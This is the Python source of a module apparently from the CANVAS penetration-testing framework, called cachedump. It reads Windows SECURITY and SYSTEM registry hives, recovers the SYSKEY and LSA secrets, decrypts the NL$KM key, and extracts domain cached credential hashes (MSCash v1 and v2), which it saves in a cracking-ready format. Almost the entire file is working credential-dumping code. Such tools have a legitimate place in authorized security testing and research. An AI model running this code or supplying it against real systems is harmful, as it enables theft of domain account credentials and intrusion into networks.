#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  cachedump.py
## Description:
##            :
## Created_On :  Mon Jan  7 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localexploit import LocalExploit
from canvaserror import NodeCommandError
from exploitutils import *
from ExploitTypes.localcommand import LocalCommand

NAME                            = "cachedump"
DESCRIPTION                     = "Extracts the domain cached credentials out of the SECURITY and SYSTEM hives."

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
Tested on:
    - Windows XP (mscashv1)
    - Windows 2012 (mscashv2)

The original algorithm and tool for Windows XP was first published by Arnaud Pilon 
(see ref. a). This module was written using the various bit of explanations found at:

a) http://www.securiteam.com/tools/5JP0I2KFPA.html
b) http://moyix.blogspot.com/2008/02/cached-domain-credentials.html
c) https://support.microsoft.com/en-us/help/172931/cached-domain-logon-information
d) https://openwall.info/wiki/john/MSCash2 (for win7 and above)

This module is similar to:
- cachedump: https://github.com/moyix/creddump (XP version only)
"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Commands'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ 'XP', '7', '2008', '2012', '2016' ]

# Necessary to import & decrypt the hashes.
import libs.libwincreds.libwincreds as libwincreds
import libs.libwinreg.libwinreg as libwinreg

SYSTEM_CONTROL_LSA_PATH  = '\\ControlSet%03d\\Control\\Lsa'
POLICY_POLSECENCKEY_PATH = '\\Policy\\PolSecretEncryptionKey'
POLICY_POLSECNL_PATH     = '\\Policy\\Secrets\\NL$KM\\CurrVal'
POLICY_POLEKLIST_PATH    = '\\Policy\\PolEKList'
SELECT_PATH              = '\\Select'
POLICY_PATH              = '\\Policy'
CACHE_PATH               = '\\Cache'

ENCVAL_HDR_SIZE          = 12
SESSION_KEY_SIZE         = 32

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result                 = []
        self.name                   = NAME
        # Args
        self.savefile               = "cached_credentials.txt"
        self.security_file          = ''
        self.system_file            = ''
        self.verbose                = False    # If enabled adds extra logs
        # Globals
        self.security_parser        = None
        self.system_parser          = None
        self.is_windows_xp          = False
        self.syskey                 = ''
        self.encrypted_lmkey        = ''       # Encrypted version of NL$KM
        self.lmkey                  = ''       # Decrypted version of NL$KM
        self.polsecretkey           = ''       # Windows XP/2003 and below 
        self.lsakey                 = ''       # Windows 7/2008 and after
        self.cached_creds           = []
        self.john_file              = ''


    def getargs(self):
        """
        Parsing of CLI/GUI arguments.
        """

        self.savefile = self.argsDict.get("savefile", self.savefile)
        self.security_file = self.argsDict.get("security_file", self.security_file)
        self.system_file = self.argsDict.get("system_file", self.system_file)
        self.verbose = bool(self.argsDict.get("verbose", self.verbose))

        if not self.security_file or not self.system_file:
            logging.error('You must specify both paths')
            return 0

        try:
            self.security_parser = libwinreg.WinRegParser(self.security_file)
            self.system_parser = libwinreg.WinRegParser(self.system_file)
        except Exception as e:
            logging.error('Could not initialize the reg parsers: %s' % str(e))
            return 0
        
        if self.verbose:
            logging.info('Enabling extra debug logs')
            self.set_debug_mode()

        return 1

    ###
    # Debug API
    ###

    def set_debug_mode(self):
        """
        Adds some local verbosity.
        """

        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG)


    def unset_debug_mode(self):
        """
        Removes local verbosity.
        """

        logger = logging.getLogger()
        logger.setLevel(logging.INFO)

    ###
    # Registry / Secrets - Common API
    ###


    def get_policy_keys(self):
        """
        Retrieves the list of subkeys below HKLM\\Security\\Policy.
        """

        cell_policy = self.security_parser.get_keynode_by_name(POLICY_PATH)
        if not cell_policy:
            logging.error('Could not open HKLM\\Security%s!' % POLICY_PATH)
            return []

        return self.security_parser.get_subkeys(cell_policy.get_data())


    def is_windows_xp_or_below(self):
        """
        This functions returns True if it detects that the registry hives contain
        names of registry keys from Windows XP/2003 or below.
        """

        polsecretenckey_detected = False
        poleklist_detected = False

        for subk in self.policy_keys:
            subk_name = subk.get_data().get_keyname()
            if subk_name == 'PolSecretEncryptionKey':
                polsecretenckey_detected = True
            if subk_name == 'PolEKList':
                poleklist_detected = True

        if polsecretenckey_detected and poleklist_detected:
            warn_msg  = 'polsecretenckey_detected and poleklist_detected are both True.'
            warn_msg += ' This should _not_ happen, someone might be trying to fool us!'
            warn_msg += ' Assuming Windows 7 and above.'
            logging.warning(warn_msg)
            return False

        if polsecretenckey_detected:
            logging.debug('Windows XP or below was detected')
            return True

        if poleklist_detected:
            logging.debug('Windows 7 or above was detected')
            return False


    def get_control_index(self):
        """
        Returns the interger value within \\Select\\Current.
        """

        try:
            cell_select = self.system_parser.get_keynode_by_name(SELECT_PATH)
            if not cell_select:
                logging.error('Could not open HKLM\\System%s!' % SELECT_PATH)
                return -1

            current_cell = self.system_parser.get_keyvalue_by_name(cell_select.get_data(), 'Current')
            current_data = self.system_parser.get_rawdata_from_keyvalue(current_cell.get_data())
            return struct.unpack('<L', current_data)[0]

        except Exception as e:
            logging.warning('get_control_index() encountered a parsing error, this might not be fatal: %s', str(e))
            return -1


    def get_syskey(self, idx_control):
        """
        Retrieves the SYSKEY.
        """

        try:

            classes = {}
            control_path = SYSTEM_CONTROL_LSA_PATH % idx_control
            cell_lsa = self.system_parser.get_keynode_by_name(control_path)
            if not cell_lsa:
                logging.error('Could not open HKLM\\System%s!' % control_path)
                return

            lsa_subkeys = self.system_parser.get_subkeys(cell_lsa.get_data())
            for subkey in lsa_subkeys:
                if subkey.get_data().get_keyname() in [ 'JD', 'Skew1', 'GBG', 'Data' ]:
                    class_data = self.system_parser.get_class_from_keynode(subkey.get_data())
                    classes[subkey.get_data().get_keyname()] = class_data.decode('utf-16-le').decode('hex')

            self.syskey = libwincreds.ExtractSysKey(classes['JD'],
                                                    classes['Skew1'],
                                                    classes['GBG'],
                                                    classes['Data'])

        except Exception as e:
            logging.error('get_syskey() failed: %s' % str(e))


    def get_encrypted_credentials(self):
        """
        Retrieves the Values stored within the HKLM\\Security\\Cache\\NL$Foo keys.
        """

        try:
            cell_cache = self.security_parser.get_keynode_by_name(CACHE_PATH)
            if not cell_cache:
                logging.info('No cached credentials or the target is not part of a Windows domain!')
                return 1

            cached_values = self.security_parser.get_values(cell_cache.get_data())

            if len(cached_values) == 1:
                logging.warning('cached_values: Single value, this is may be because of number of allowed cache credentials is set to 0.')

            for cached_value in cached_values:

                cell_name = cached_value.get_data().get_name()
                if cell_name == 'NL$Control' or cell_name == 'NL$IterationCount':
                    continue

                cell_value = self.security_parser.get_rawdata_from_keyvalue(cached_value.get_data())
                logging.debug('Extracted %s for key %s' % (cell_value.encode('hex'), cell_name))
                cached_cred = {}
                cached_cred['name'] = cell_name
                cached_cred['raw'] = cell_value
                self.cached_creds.append(cached_cred)

            return 1

        except Exception as e:
            logging.error('An error occured during the parsing of HKLM\\Security%s!' % CACHE_PATH)
            return 0

    def get_encrypted_lmkey(self):
        """
        Extract the encrypted key out of HKLM\\Security\\Secrets\\NL$KM\\Currval.
        Note: The parsing and decryption of that record is handled by decrypt_lmkey_for_{XP,7}
        """

        try:
            cell_currval = self.security_parser.get_keynode_by_name(POLICY_POLSECNL_PATH)
            if not cell_currval:
                logging.error('Could not open HKLM\\Security%s!' % POLICY_POLSECNL_PATH)
                return 0

            cell_currval_values = self.security_parser.get_values(cell_currval.get_data())

            if len(cell_currval_values) != 1:
                logging.warning('cell_currval_values: More than one value, this is suspicious!')

            self.encrypted_lmkey = self.security_parser.get_rawdata_from_keyvalue(cell_currval_values[0].get_data())
            logging.debug('LM$KM Cell Value: %s' % (self.encrypted_lmkey .encode('hex')))
            return 1

        except Exception as e:
            logging.error('An error occured during the parsing of HKLM\\Security%s!' % POLICY_POLSECNL_PATH)
            return 0

    def parse_encrypted_creds(self):
        """
        Parses the encrypted cached record following Arnaud Pillon's naming scheme.
        """

        for cached_cred in self.cached_creds:

            cred_name = cached_cred['name']
            cred_enc_value = cached_cred['raw']

            # We use Arnaud Pilon's naming scheme
            # http://www.securiteam.com/tools/5JP0I2KFPA.html

            # Initialization of the records
            cached_cred['MD'] = ''
            cached_cred['CH'] = ''
            cached_cred['T'] = ''
            cached_cred['EDATA'] = ''

            # Additional variables
            cached_cred['USERNAME_LENGTH'] = 0
            cached_cred['DOMAIN_LENGTH'] = 0

            # Parsing. Practically it should not fail with valid registry files.
            try:

                # First of all do we even have filled record?
                username_size = struct.unpack('<H', cred_enc_value[:2])[0]
                if not username_size:
                    logging.info('Record %s is empty, skipping!' % cred_name)
                    continue
                else:
                    logging.info('Record %s contains cached credentials!' % cred_name)

                domain_size = struct.unpack('<H', cred_enc_value[2:4])[0]

                cached_cred['MD'] = cred_enc_value[:64]
                cached_cred['CH'] = cred_enc_value[64:64+16]
                cached_cred['T'] = cred_enc_value[64+16:64+16+16]
                cached_cred['EDATA'] = cred_enc_value[64+16+16:]

                # They are saved mostly for conveniency
                cached_cred['USERNAME_LENGTH'] = username_size
                cached_cred['DOMAIN_LENGTH'] = domain_size

            except Exception as e:
                # Something occured, possibly an unhandled type of record?
                logging.warn('Record %s could not be parsed properly, skipping!' % cred_name)
                continue

            logging.debug('Record %s: MD:%s' % (cred_name, cached_cred['MD'].encode('hex')))
            logging.debug('Record %s: CH:%s' % (cred_name, cached_cred['CH'].encode('hex')))
            logging.debug('Record %s: T:%s' % (cred_name, cached_cred['T'].encode('hex')))
            logging.debug('Record %s: EDATA:%s' % (cred_name, cached_cred['EDATA'].encode('hex')))


    def parse_decrypted_creds(self, htype):
        """
        Extracts the digest(hash), username, domain (netbios) and domain (fqdn)
        out of the decrypted mscashv{1,2} entry.
        """

        def extract_unicode_string(data, offset):
            s = ''
            i = 0
            while data[offset+i:offset+i+2] != '\0\0':
                s += data[offset+i:offset+i+2]
                i += 2
                # Safety check
                if i > 256:
                    break
            return s

        for cached_cred in self.cached_creds:

            cached_cred['digest'] = ''
            cached_cred['username'] = ''
            cached_cred['domain'] = ''
            cached_cred['domain_fqdn'] = ''

            if cached_cred['USERNAME_LENGTH']:

                try:
                    digest = cached_cred['decrypted_data'][:16]
                    if htype == 1:
                        cached_cred['mscashv1_hash'] = digest
                    else:
                        cached_cred['mscashv2_hash'] = digest
                    logging.debug("%s: digest:%s" % (cached_cred['name'], digest.encode('hex')))

                    off = 72
                    username = extract_unicode_string(cached_cred['decrypted_data'], off)
                    if len(username) != cached_cred['USERNAME_LENGTH']:
                        logging.warn("We may have a wrong username extraction!")

                    off += len(username)+2
                    domain = extract_unicode_string(cached_cred['decrypted_data'], off)
                    if len(domain) != cached_cred['DOMAIN_LENGTH']:
                        logging.warn("We may have a wrong domain extraction!")

                    off += len(domain)+2
                    domain_fqdn = extract_unicode_string(cached_cred['decrypted_data'], off)

                    # Save the creds
                    cached_cred['username'] = username.decode('utf-16-le').lower()
                    cached_cred['domain'] = domain.decode('utf-16-le').lower()
                    cached_cred['domain_fqdn'] = domain_fqdn.decode('utf-16-le').lower()

                    logging.debug("%s: username:%s" % (cached_cred['name'], username))
                    logging.debug("%s: domain:%s" % (cached_cred['name'], domain))
                    logging.debug("%s: domain_fqdn:%s" % (cached_cred['name'], domain_fqdn))

                except Exception as e:
                    logging.warn('Unknown parsing error, dropping entry!')
                    continue


    ###
    # Registry / Secrets - Windows XP and below specific API
    ###


    def get_polsecret_key(self):
        """
        Retrieves the (then encrypted) polsecret encryption/decryption key out of
        HKLM\\Security\\Policy\\PolSecretEncryptionKey. The key is then decrypted.
        """

        cell_polsec = self.security_parser.get_keynode_by_name(POLICY_POLSECENCKEY_PATH)
        if not cell_polsec:
            logging.error('Could not open %s!' % POLICY_POLSECENCKEY_PATH)
            return 0

        cell_polsec_values = self.security_parser.get_values(cell_polsec.get_data())

        if len(cell_polsec_values) != 1:
            logging.warning('cell_polsec_values: More than one value, this is suspicious!')

        encrypted_polsecretkey = self.security_parser.get_rawdata_from_keyvalue(cell_polsec_values[0].get_data())
        if not encrypted_polsecretkey:
            logging.error('Could not extract correctly the encrypted polsecretkey!')
            return 0

        self.polsecretkey = libwincreds.DecryptPolSecretEncryptionKey(encrypted_polsecretkey, self.syskey)
        logging.debug('polsecretkey: %s' % self.polsecretkey.encode('hex'))
        return 1


    def decrypt_lmkey_for_XP(self):
        """
        Calls DecryptPolSecret to decrypt the LM$KM key.
        """

        try:

            # If we have no more than just metadata we skip it.
            if len(self.encrypted_lmkey) == ENCVAL_HDR_SIZE:
                logging.info('Key %s has an empty value, skipping!' % 'NL$KM')
                return 0

            if len(self.encrypted_lmkey) < ENCVAL_HDR_SIZE:
                logging.warning('Key %s has a broken record (%d < 12)! Dropping!' % ('NL$KM', len(self.encrypted_lmkey)))
                return 0

            length = struct.unpack('<L', self.encrypted_lmkey[:4])[0]
            data = self.encrypted_lmkey[ENCVAL_HDR_SIZE:]

            if len(data) != length:
                logging.warning('Key %s has a broken record (%d != %d)! Dropping!' % ('NL$KM', len(data), cell_value_length))
                return 0

            if len(data) % 8:
                logging.warning('Key %s has a broken record (not an exact number of blocks)! Dropping!' % 'NL$KM')
                return 0

            # Decrypt the secret using the decrypted polsecretkey
            self.lmkey = libwincreds.DecryptPolSecret(data, self.polsecretkey)
            if not self.lmkey:
                logging.info('Key %s has an empty decrypted value!' % 'NL$KM')

            return 1

        except Exception as e:
            # Something occured, possibly within libwincreds.DecryptPolSecret()?
            return 0


    def decrypt_cached_creds_for_XP(self):
        """
        Parses and decrypts all the MSCASHv1 entries.
        """

        for cached_cred in self.cached_creds:

            # Initialization
            cached_cred['decrypted_data'] = ''

            try:

                cred_name = cached_cred['name']
                logging.debug('Decrypting cached value for %s' % cred_name)

                if cached_cred['USERNAME_LENGTH']:
                    hmac_key = cached_cred['CH']
                    encrypted_data = cached_cred['EDATA']
                    cached_cred['decrypted_data'] = libwincreds.DecryptMsCashV1(encrypted_data, self.lmkey, hmac_key)
                    logging.debug('Decrypted buffer: %s' % cached_cred['decrypted_data'].encode('hex'))

            except Exception as e:
                # Something occured, possibly within libwincreds.DecryptMsCashV1()?
                logging.warn('Something failed during the decryption of the v1 record, skipping!')
                continue

    ###
    # Registry / Secrets - Windows 7 and after specific API.
    ###


    def get_lsakey(self):
        """
        Retrieves the (then encrypted) lsakey out of HKLM\\Security\\Policy\\PolEkList.
        Note: PolEkList (theoretically) keeps a list of keys but practically it seems
              to keep only one. This may later be a problem!
        """

        try:
            cell_poeklist = self.security_parser.get_keynode_by_name(POLICY_POLEKLIST_PATH)
            if not cell_poeklist:
                logging.error('Could not open %s!' % POLICY_POLEKLIST_PATH)
                return 0

            cell_poeklist_values = self.security_parser.get_values(cell_poeklist.get_data())
            if not cell_poeklist_values or not len(cell_poeklist_values):
                logging.error('Could not read values from %s!' % POLICY_POLEKLIST_PATH)
                return 0

            encrypted_poeklist = self.security_parser.get_rawdata_from_keyvalue(cell_poeklist_values[0].get_data())
            if not encrypted_poeklist or not len(encrypted_poeklist):
                logging.error('Could not read values from %s!' % POLICY_POLEKLIST_PATH)
                return 0

            version = struct.unpack('>L', encrypted_poeklist[:4])[0]
            key_id, enc_id, dec_flags = struct.unpack('<16sLL', encrypted_poeklist[4:28])
            session_key = encrypted_poeklist[28:28+SESSION_KEY_SIZE]
            encrypted_data = encrypted_poeklist[60:]

            logging.debug('%s: Version:%d, Algorithm:%d, Flags:%x, KeyID:%s' % ('PolEkList', version, enc_id, dec_flags, key_id.encode('hex')))
            logging.debug('%s: SessionKey:%s' % ('PolEkList', session_key.encode('hex')))
            logging.debug('%s: Encrypted data: %s' % ('PolEkList', encrypted_data.encode('hex')))

            data = libwincreds.LsaEncryptDecrypt(encrypted_data, self.syskey, session_key, 1000)
            if not data:
                logging.error('LsaEncryptDecrypt() returned an empty string!')
                return 0

            self.lsakey = data[68:68+32]
            logging.debug('LsaKey: %s' % self.lsakey.encode('hex'))

            return 1

        except Exception as e:
            logging.error('An exception occured while attempting to retrieve the LSAkey')
            return 0


    def decrypt_lmkey_for_7(self):
        """
        Calls LsaEncryptDecrypt to decrypt the LM$KM key.
        """

        cell_value = self.encrypted_lmkey

        try:
            version = struct.unpack('>L', cell_value[:4])[0]
            key_id, enc_id, dec_flags = struct.unpack('<16sLL', cell_value[4:28])
            session_key = cell_value[28:28+SESSION_KEY_SIZE]
            encrypted_data = cell_value[28+SESSION_KEY_SIZE:]
            logging.debug('%s: Version:%d, Algorithm:%d, Flags:%x, KeyID:%s' % ('LM$KM key', version, enc_id, dec_flags, key_id.encode('hex')))
            logging.debug('%s: SessionKey:%s' % ('LM$KM key', session_key.encode('hex')))
            logging.debug('%s: Encrypted data: %s' % ('LM$KM key', encrypted_data.encode('hex')))
        except Exception as e:
            logging.warn('%s: Parsing error before decryption!' % 'LM$KM key')
            return 0

        raw_data = libwincreds.LsaEncryptDecrypt(encrypted_data, self.lsakey, session_key, 1000)
        logging.debug('Decrypted LM$KM value: %s' % raw_data.encode('hex'))

        try:
            data_length = struct.unpack('<L', raw_data[:4])[0]
            if not data_length or len(raw_data) == 16:
                logging.info('Key %s has an empty decrypted value!' % 'LM$KM key')
                return 0

            decrypted_data = ''
            if len(raw_data) > 16:
                decrypted_data = raw_data[16:16+data_length]

            logging.debug('%s: Length=%d, data:%s' % ('LM$KM key', data_length, decrypted_data.encode('hex')))
        except Exception as e:
            logging.warn('%s: Parsing error after decryption!' % 'LM$KM key')
            return 0

        self.lmkey = decrypted_data
        return 1


    def decrypt_cached_creds_for_7(self):
        """
        Parses and decrypts all the MSCASHv2 entries.
        """

        nr_iterations = libwincreds.MSCASH2_DEFAULT_ITER

        def get_nr_iterations(nr_iters):
            if nr_iters < 1024:
                return nr_iters << 10
            elif nr_iters > libwincreds.MSCASH2_DEFAULT_ITER:
                return nr_iters & (~0x3ff)
            else:
                return nr_iters

        # First of all we have to be sure that there isn't a fixed iteration!
        cell_cache = self.security_parser.get_keynode_by_name(CACHE_PATH)
        # This can only happen if there is a bug within the library since we have
        # done it before.
        if not cell_cache:
            logging.warn('Could not open %s!' % CACHE_PATH)
        else:
            cell_cache_iter = self.security_parser.get_keyvalue_by_name(cell_cache.get_data(), 'NL$IterationCount')
            if cell_cache_iter:
                res = self.security_parser.get_rawdata_from_keyvalue(cell_cache_iter.get_data())
                nr_iterations = struct.unpack('<L', res)[0]

        logging.info('MsCashV2 was most likely computed using %s iterations!' % get_nr_iterations(nr_iterations))

        for cached_cred in self.cached_creds:

            # Initialization
            cached_cred['decrypted_data'] = ''

            try:

                cred_name = cached_cred['name']
                logging.debug('Decrypting cached value for %s' % cred_name)

                if cached_cred['USERNAME_LENGTH']:
                    IV = cached_cred['CH']
                    encrypted_data = cached_cred['EDATA']
                    cached_cred['decrypted_data'] = libwincreds.DecryptMsCashV2(encrypted_data, self.lmkey, IV)
                    logging.debug('Decrypted buffer: %s' % cached_cred['decrypted_data'].encode('hex'))

            except Exception as e:
                # Something occured, possibly within libwincreds.DecryptMsCashV2()?
                logging.warn('Something failed during the decryption of the v2 record, skipping!')
                continue


    ###
    # Logging / Saving API
    ###


    def dump_cached_creds(self):
        for cached_cred in self.cached_creds:
            if cached_cred['USERNAME_LENGTH']:
                if cached_cred.has_key('mscashv1_hash'):
                    digest = cached_cred['mscashv1_hash']
                elif cached_cred.has_key('mscashv2_hash'):
                    digest = cached_cred['mscashv2_hash']
                else:
                    digest = ''
                entry = '%s:%s:%s:%s' % (cached_cred['username'], digest.encode('hex'), cached_cred['domain'], cached_cred['domain_fqdn'])
                logging.info(entry)
                self.john_file += '%s\n' % entry


    def save_cached_creds(self):
        """
        Saves the cached credentials within a file.
        """

        # We may need to save these credentials
        save_loc = os.path.join(self.savepath, self.savefile)

        try:
            fd = open(save_loc,"ab")
            fd.write(self.john_file)
            fd.close()
        except Exception as e:
            logging.warning('Could not save the hashes in %s' % save_loc)
        else:
            logging.info("Saved hashes to: %s" % save_loc)

    def save_results(self):
        """
        Saves the important results from this module for any caller.
        """

        for cred in self.cached_creds:

            if not cred['username']:
                continue

            for key in cred.keys():
                if key not in ['username', 'domain', 'domain_fqdn', 'mscashv1_hash', 'mscashv2_hash']:
                    del cred[key]

            cred['domain'] = cred['domain_fqdn']
            del cred['domain_fqdn']

            self.result.append(cred)

    ###
    # The main functions
    ###

    def exploit_winXP(self):
        """
        Handles the logic of the exploit for Windows XP/2003 and below.
        """

        if not self.get_polsecret_key():
            return 0

        if not self.get_encrypted_lmkey():
            return 0

        if not self.decrypt_lmkey_for_XP():
            return 0

        # No specific error checking
        self.parse_encrypted_creds()
        self.decrypt_cached_creds_for_XP()
        self.parse_decrypted_creds(htype=1)
        return 1


    def exploit_post_winXP(self):
        """
        Handles the logic of the exploit for Windows 7/2008 and above.
        """

        if not self.get_lsakey():
            return 0

        if not self.get_encrypted_lmkey():
            return 0

        if not self.decrypt_lmkey_for_7():
            return 0

        # No specific error checking
        self.parse_encrypted_creds()
        self.decrypt_cached_creds_for_7()
        self.parse_decrypted_creds(htype=2)
        return 1


    def run(self):
        """
        The entry point.
        """

        self.setInfo("%s" % NAME)
        if not self.getargs():
            return 0

        # We need a directory to save results
        self.savepath = self.output(subdir="PasswordHashes")

        idx_ctrl = self.get_control_index()
        if idx_ctrl == -1:
            logging.warning('Could not retrieve the control index, assuming 1 just in case.')
            idx_ctrl = 1

        self.get_syskey(idx_ctrl)
        if not self.syskey:
            logging.error('Could not retrieve the SYSKEY')
            return 0

        logging.info('Successfully retrieved the syskey')
        logging.debug('syskey: %s' % self.syskey.encode('hex'))

        self.policy_keys = self.get_policy_keys()
        if not self.policy_keys:
            logging.error('Could not retrieve the policy keys, something is very wrong!')
            return 0

        if not self.get_encrypted_credentials() or not len(self.cached_creds):
            logging.info('Could not retrieve any cache record.')
            return 0

        self.is_windows_xp = self.is_windows_xp_or_below()

        if self.is_windows_xp:
            ret = self.exploit_winXP()
        else:
            ret = self.exploit_post_winXP()

        # If we had an error returned at that point then it is a complete failure.
        if not ret:
            self.setInfo("%s - done (failed)" % (NAME))
            return 0

        if self.verbose:
            self.unset_debug_mode()

        # Otherwise we proceed with the dumping of the secrets in the console and
        # we save them within a file (self.savefile)
        self.dump_cached_creds()
        self.save_cached_creds()
        self.save_results()

        nr_cached_creds_revealed = len([ cached_cred for cached_cred in self.cached_creds if len(cached_cred['username'])])
        self.setProgress(100)
        self.setInfo("%s - done (success: %s)" % (NAME, "%d secrets found" % nr_cached_creds_revealed))
        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
